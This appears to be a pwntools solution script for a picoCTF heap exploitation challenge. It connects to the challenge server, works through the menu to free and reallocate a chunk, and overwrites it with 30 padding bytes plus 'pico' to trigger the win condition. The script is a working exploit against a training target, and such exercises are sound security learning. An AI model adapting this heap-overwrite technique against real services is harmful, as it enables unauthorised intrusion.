#!/usr/bin/env python3
from pwn import *

io = remote("tethys.picoctf.net", 51417)
io.recvuntil(b'Enter your choice: ')
io.sendline(b'5')
io.recvuntil(b'Enter your choice: ')
io.sendline(b'2')
io.recvuntil(b'Size of object allocation: ')
io.sendline(b'35')
io.recvuntil(b'Data for flag: ')
code = flat([
	b'A'*30,
	'pico'
	])
io.sendline(code)
io.recvuntil(b'Enter your choice: ')
io.sendline(b'4')


io.interactive()